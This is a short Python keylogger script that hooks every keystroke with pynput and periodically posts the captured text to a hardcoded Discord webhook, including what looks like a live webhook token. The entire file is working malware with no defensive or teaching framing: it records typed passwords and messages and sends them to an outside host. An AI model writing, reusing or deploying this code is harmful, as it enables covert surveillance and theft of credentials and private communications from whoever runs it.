from pynput import keyboard
import requests
import time

WEBHOOK_URL = 'https://discord.com/api/webhooks/1267879781404250123/X83marVWwVCWcCfycTSqdGdvFCgSVwNF1BXzS5A_HI-OlIf_A1DX-6I6xz9sJxP2SIvS'
keystrokes = ""

def send_to_discord(message):
    data = {
        "content": message,
        "username": "Keylogger"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        response.raise_for_status()
        print("Payload delivered successfully, code {}.".format(response.status_code))
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except Exception as err:
        print(f"An error occurred: {err}")

def on_press(key):
    global keystrokes
    try:
        if key.char:  # Normal keys
            keystrokes += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            keystrokes += " "
        else:
            keystrokes += f"[{key.name}]"

    # Send keystrokes to Discord every 10 seconds
    if len(keystrokes) > 0 and (time.time() % 10) < 0.1:
        send_to_discord(keystrokes)
        keystrokes = ""

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()